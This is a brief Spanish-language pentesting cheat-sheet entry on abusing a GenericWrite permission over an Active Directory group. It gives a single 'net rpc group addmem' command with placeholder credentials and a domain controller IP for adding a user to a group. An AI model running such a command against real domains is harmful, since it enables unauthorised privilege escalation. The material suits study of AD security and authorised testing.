# Abuso ACL 

Tags: #AD #ACL #Linux #Net 

## GenericWrite sobre Grupo

Si tenemos esta ACL sobre un **Group**, podemos **modificar determinados atributos del grupo**, incluyendo su membresía bajo las condiciones adecuadas.

```bash 
# Añadirte al grupo   
❯ net rpc group addmem 'Group' 'TargetUser' -U Domain.local/ControlledUser%'P@$$w0rd123!' -S IP_DC

	# Group = Es el nombre del grupo al cual nos agregaremos
	# TargetUser = Es el usuario que se agregará al grupo 
	# ControlledUser = Usuario que cuenta con los privilegios 
```